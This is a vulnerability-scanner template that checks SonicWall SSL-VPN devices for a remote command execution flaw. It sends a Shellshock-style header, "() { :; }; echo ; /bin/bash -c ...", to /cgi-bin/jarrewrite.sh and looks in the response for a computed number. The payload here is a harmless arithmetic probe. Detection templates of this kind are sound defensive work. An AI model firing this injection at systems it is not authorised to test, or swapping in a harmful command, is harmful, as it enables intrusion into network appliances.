expression: r0()
id: sonicwall-ssl-vpn-rce
info:
  author: sharecast
  description: "SonicWall SSL-VPN \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u57281\u6708\
    24\u65E5\u88AB\u516C\u5F00 EXP\uFF0C\u6B64\u8BBE\u5907\u5B58\u5728\u8FDC\u7A0B\
    \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\napp=\"SONICWALL-SSL-VPN\"\n"
  name: "SonicWall SSL-VPN \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      - r2)))
    request:
      headers:
        X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
      method: GET
      path: /cgi-bin/jarrewrite.sh
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(1140000, 1144800)
